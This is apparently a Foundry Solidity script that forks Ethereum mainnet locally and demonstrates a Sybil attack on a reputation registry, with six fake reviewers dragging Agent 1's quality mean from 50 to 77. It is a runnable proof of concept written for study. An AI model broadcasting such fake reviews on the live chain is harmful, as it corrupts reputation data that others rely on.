// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {IReputationRegistry} from "../src/interfaces/IReputationRegistry.sol";

/// @title AttackLab demonstration script
/// @notice Runnable version of the mean-manipulation experiment: forks mainnet
///         at a pinned block, prints the honest `quality` summary for Agent 1,
///         then shows six synthetic reviewers dragging the naive mean 50 -> 77.
///         Everything runs on the local fork; nothing is broadcast.
/// @dev Run with: `forge script script/AttackLab.s.sol` (MAINNET_RPC_URL in env).
contract AttackLabScript is Script {
    /// @dev Ethereum Mainnet Reputation Registry (ERC-1967 proxy) — same as the test.
    address internal constant REPUTATION_REGISTRY = 0x8004BAa17C55a88189AE136b182e5fdA19dE9b63;

    /// @dev Pinned mainnet block where Agent 1's baseline entries exist.
    uint256 internal constant FORK_BLOCK = 26330000;

    /// @dev The agent under attack.
    uint256 internal constant AGENT_ID = 1;

    /// @dev Number of synthetic attackers.
    uint256 internal constant ATTACKER_COUNT = 6;

    function run() public {
        // Fork mainnet at the pinned block. RPC comes from the environment
        // (never hardcoded); the fork is local and no tx is broadcast.
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
        IReputationRegistry registry = IReputationRegistry(REPUTATION_REGISTRY);

        // --- Initial quality summary ---
        // getSummary needs a non-empty client list, so read the current authors
        // and filter to tag1 = "quality".
        address[] memory initialClients = registry.getClients(AGENT_ID);
        (uint64 initialCount, int128 initialMean, uint8 initialDecimals) =
            registry.getSummary(AGENT_ID, initialClients, "quality", "");
        console2.log("initial  count   :", uint256(initialCount));
        console2.log("initial  mean    :", int256(initialMean));
        console2.log("initial  decimals:", uint256(initialDecimals));
        require(initialCount == 5, "initial count must be 5");
        require(initialMean == int128(50), "initial mean must be 50");
        require(initialDecimals == 0, "initial decimals must be 0");

        // --- Six deterministic, pairwise-distinct attacker addresses ---
        // Mirror forge-std's makeAddr (not available on Script): derive the
        // address from a string seed and label it for readable traces.
        address[] memory attackers = new address[](ATTACKER_COUNT);
        for (uint256 i = 0; i < ATTACKER_COUNT; i++) {
            string memory name = string.concat("attacker-", vm.toString(i));
            address attacker = vm.addr(uint256(keccak256(abi.encodePacked(name))));
            vm.label(attacker, name);
            attackers[i] = attacker;
        }
        for (uint256 i = 0; i < ATTACKER_COUNT; i++) {
            for (uint256 j = i + 1; j < ATTACKER_COUNT; j++) {
                require(attackers[i] != attackers[j], "attackers must be pairwise distinct");
            }
        }

        // --- Each attacker posts one quality=100 review (local fork only) ---
        // vm.prank sets msg.sender for exactly the next call, so each entry is
        // authored by a distinct address; none is the agent owner/operator.
        for (uint256 i = 0; i < ATTACKER_COUNT; i++) {
            vm.prank(attackers[i]);
            registry.giveFeedback(AGENT_ID, int128(100), uint8(0), "quality", "", "", "", bytes32(0));
        }

        // --- Updated summary ---
        // Re-fetch clients: getClients is append-only and each attacker became a
        // new client, so the pre-attack list would miss them.
        address[] memory updatedClients = registry.getClients(AGENT_ID);
        (uint64 updatedCount, int128 updatedMean, uint8 updatedDecimals) =
            registry.getSummary(AGENT_ID, updatedClients, "quality", "");
        console2.log("updated  count   :", uint256(updatedCount));
        console2.log("updated  mean    :", int256(updatedMean));
        console2.log("updated  decimals:", uint256(updatedDecimals));

        // 5 entries of 50 + 6 of 100 = 850 over 11 -> floor(850/11) = 77.
        require(updatedCount == 11, "updated count must be 11");
        require(updatedMean == int128(77), "manipulated mean must be 77");
        require(updatedDecimals == 0, "updated decimals must be 0");

        console2.log("AttackLab: naive mean dragged 50 -> 77 by 6 fake reviewers.");
    }
}
